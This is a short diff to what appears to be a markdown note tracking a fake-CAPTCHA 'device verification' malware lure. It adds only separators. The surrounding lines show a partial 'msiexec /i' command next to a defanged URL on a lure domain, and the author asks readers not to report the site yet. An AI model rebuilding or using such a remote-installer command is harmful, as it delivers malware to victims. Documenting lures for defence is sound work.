@@ -4,6 +4,8 @@
 
 できれば、まだ報告しないでね。これは私にとって宝物なんだ、へへ :p
 
+----
+
 <img src="https://iad.microlink.io/98ZQbV6SApZYfUMvt2KTb5c0ILTcuTZ8Qt57Rk9UMDCm-v4wRxz-ke2lAi3afZPUlaNKGWpvpCobWpEjJaQIwg.png" width="100%">
 
 ```
@@ -45,6 +47,7 @@ msiexec /i
 hxxps[:]//pizzabyte[.]com[.]au/smartdetection/deviceverification/CF/path/captcha
 ```
 
+----
 
 - https://stevesec.com/?page_id=284
 - https://gist.github.com/adulau/6cf6f3e9c5bbd9106af8814d0a22f473
